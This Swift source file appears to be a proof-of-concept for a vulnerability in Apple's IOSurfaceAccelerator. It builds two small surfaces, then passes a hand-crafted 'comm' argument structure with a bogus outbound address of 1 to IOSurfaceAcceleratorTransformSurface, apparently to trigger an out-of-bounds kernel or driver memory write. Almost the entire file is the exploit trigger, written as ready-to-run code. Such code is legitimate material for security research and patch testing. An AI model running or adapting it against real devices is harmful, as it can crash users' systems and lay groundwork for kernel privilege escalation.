import CoreVideo
import IOSurface

// size is 0x28
struct CommArg {
  let inboundType: Int32  // 0x0
  let inboundAddress: UInt64  // 0x8
  let inboundSize: Int32  // 0x10
  let outboundType: Int32  // 0x14
  let outboundAddress: UInt64  // 0x18
  let unused20: Int64  // 0x20
}

func snakesOnAPlane() {
  guard
    let sourceSurface = IOSurface(properties: [
      .width: 16, .height: 16, .pixelFormat: kCVPixelFormatType_32BGRA,
    ])
  else {
    print("source surface is null")
    return
  }
  guard
    let destinationSurface = IOSurface(properties: [
      .width: 16, .height: 16, .pixelFormat: kCVPixelFormatType_32BGRA,
    ])
  else {
    print("dest surface is null")
    return
  }
  // https://github.com/WebKit/WebKit/commit/5e7ebb4f4f0592ad2911b8eb84da81ba900b0f4a
  var accelerator: IOSurfaceAcceleratorRef? = nil
  var err = IOSurfaceAcceleratorCreate(nil, nil, &accelerator)
  guard err == kIOReturnSuccess else {
    print("accelerator fail: \(err)")
    return
  }
  guard let accelerator = accelerator else {
    print("accelerator null")
    return
  }
  #if false
    let firstMutableOutput = NSMutableData(length: 0x4000)!
    let outboundAddress = UInt64(UInt(bitPattern: firstMutableOutput.mutableBytes))
  #endif
  let outboundAddress = UInt64(1)
  var firstCommArg = CommArg(
    inboundType: 0, inboundAddress: 0, inboundSize: 0, outboundType: 1,
    outboundAddress: outboundAddress, unused20: 0)
  let firstData = Data(bytes: &firstCommArg, count: MemoryLayout.size(ofValue: firstCommArg))
  let transformOptions: [String: Any] = [String(kIOSurfaceAcceleratorComm): [firstData]]
  err = IOSurfaceAcceleratorTransformSurface(
    accelerator, sourceSurface, destinationSurface, /*options=*/
    transformOptions as CFDictionary, /*pCropRectangles=*/
    nil, /*pCompletion=*/ nil, /*pSwap=*/ nil, /*pCommandID=*/ nil)
  guard err == kIOReturnSuccess else {
    print("transform fail: \(err) \(String(cString: mach_error_string(err)!))")
    return
  }
}

snakesOnAPlane()
